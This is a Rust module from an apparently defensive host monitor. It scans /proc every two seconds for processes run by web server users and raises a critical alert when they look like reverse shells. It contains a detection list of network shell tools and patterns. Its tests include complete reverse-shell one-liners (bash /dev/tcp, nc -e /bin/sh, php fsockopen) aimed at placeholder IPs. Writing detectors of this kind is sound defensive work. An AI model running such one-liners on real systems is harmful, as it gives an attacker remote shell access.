use crate::models::CollectorMessage;
#[cfg(target_os = "linux")]
use crate::models::{EventCategory, SecurityEvent, Severity};
use std::collections::HashSet;
use std::time::Duration;
use tokio::sync::mpsc;
use tracing::debug;
#[cfg(target_os = "linux")]
use tracing::warn;

const SUSPICIOUS_BINARIES: &[&str] = &[
    "nc", "ncat", "netcat", "socat", "sh", "bash", "dash", "zsh", "python", "python3", "perl",
    "ruby", "telnet",
];

const SUSPICIOUS_CMD_PATTERNS: &[&str] = &[
    "/dev/tcp/",
    "/dev/udp/",
    "bash -i",
    "sh -i",
    "mkfifo",
    "fsockopen",
    "pty.spawn",
    "base64 -d",
];

/// Evaluates whether a process name / command line spawned by a web server user
/// indicates a reverse shell or post-exploitation activity.
pub fn is_suspicious_web_process(comm: &str, cmdline: &str) -> bool {
    let comm_lower = comm.trim().to_ascii_lowercase();
    let cmd_lower = cmdline.to_ascii_lowercase();

    if SUSPICIOUS_BINARIES.iter().any(|b| comm_lower == *b) {
        return true;
    }

    SUSPICIOUS_CMD_PATTERNS
        .iter()
        .any(|pat| cmd_lower.contains(pat))
}

/// Spawns a lightweight `/proc` monitor on Linux to detect reverse shells or shell commands
/// spawned by web server users (`www-data`, `nginx`, `apache`, `http`), even when HTTP logs show nothing.
pub fn spawn_process_watcher(
    tx: mpsc::Sender<CollectorMessage>,
    mut shutdown: tokio::sync::broadcast::Receiver<()>,
) {
    #[cfg(target_os = "linux")]
    {
        tokio::spawn(async move {
            let web_uids = resolve_web_server_uids();
            if web_uids.is_empty() {
                debug!("No web server UIDs (www-data/nginx/apache) found in /etc/passwd");
                return;
            }
            debug!("Process watcher active for web UIDs: {:?}", web_uids);

            let mut alerted_pids: HashSet<u32> = HashSet::new();
            let mut interval = tokio::time::interval(Duration::from_secs(2));

            loop {
                tokio::select! {
                    _ = shutdown.recv() => break,
                    _ = interval.tick() => {
                        let mut current_pids = HashSet::new();
                        if let Ok(entries) = std::fs::read_dir("/proc") {
                            for entry in entries.flatten() {
                                let fname = entry.file_name();
                                let Ok(pid) = fname.to_string_lossy().parse::<u32>() else {
                                    continue;
                                };
                                current_pids.insert(pid);
                                if alerted_pids.contains(&pid) {
                                    continue;
                                }
                                let proc_dir = entry.path();
                                if let Some(uid) = read_proc_uid(&proc_dir) {
                                    if !web_uids.contains(&uid) {
                                        continue;
                                    }
                                    let comm = std::fs::read_to_string(proc_dir.join("comm"))
                                        .unwrap_or_default()
                                        .trim()
                                        .to_string();
                                    let cmdline = std::fs::read(proc_dir.join("cmdline"))
                                        .map(|bytes| {
                                            bytes
                                                .split(|&b| b == 0)
                                                .filter(|s| !s.is_empty())
                                                .map(|s| String::from_utf8_lossy(s).into_owned())
                                                .collect::<Vec<_>>()
                                                .join(" ")
                                        })
                                        .unwrap_or_default();

                                    if is_suspicious_web_process(&comm, &cmdline) {
                                        alerted_pids.insert(pid);
                                        warn!("Suspicious web process PID {pid} (uid={uid}): {comm} | {cmdline}");
                                        let evt = SecurityEvent::new(
                                            Severity::Critical,
                                            EventCategory::ReverseShell,
                                            format!("Suspicious Shell/Process by Web User (PID {pid})"),
                                            format!("Web user (uid={uid}) spawned '{comm}'"),
                                        )
                                        .with_rule_id("AEGIS-PROC-REVSHELL")
                                        .with_raw_snippet(cmdline);
                                        let _ = tx.send(CollectorMessage::DirectEvent(evt)).await;
                                    }
                                }
                            }
                        }
                        alerted_pids.retain(|pid| current_pids.contains(pid));
                    }
                }
            }
        });
    }

    #[cfg(not(target_os = "linux"))]
    {
        let _ = (tx, Duration::from_secs(0), HashSet::<u32>::new());
        tokio::spawn(async move {
            let _ = shutdown.recv().await;
            debug!("Process watcher is Linux-only (/proc); skipping on this OS");
        });
    }
}

#[cfg(target_os = "linux")]
fn resolve_web_server_uids() -> HashSet<u32> {
    let mut uids = HashSet::new();
    let web_users = ["www-data", "nginx", "apache", "http"];
    if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
        for line in passwd.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 3 && web_users.contains(&parts[0]) {
                if let Ok(uid) = parts[2].parse::<u32>() {
                    uids.insert(uid);
                }
            }
        }
    }
    uids
}

#[cfg(target_os = "linux")]
fn read_proc_uid(proc_dir: &std::path::Path) -> Option<u32> {
    let status = std::fs::read_to_string(proc_dir.join("status")).ok()?;
    for line in status.lines() {
        if let Some(rest) = line.strip_prefix("Uid:") {
            return rest.split_whitespace().next()?.parse::<u32>().ok();
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_suspicious_web_process_detection() {
        assert!(is_suspicious_web_process("bash", "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1"));
        assert!(is_suspicious_web_process("nc", "nc -e /bin/sh 198.51.100.1 9001"));
        assert!(is_suspicious_web_process("php-fpm", "php -r 'fsockopen(\"1.2.3.4\", 4444);'"));
        assert!(!is_suspicious_web_process("php-fpm8.2", "php-fpm: pool www"));
        assert!(!is_suspicious_web_process("nginx", "nginx: worker process"));
    }
}
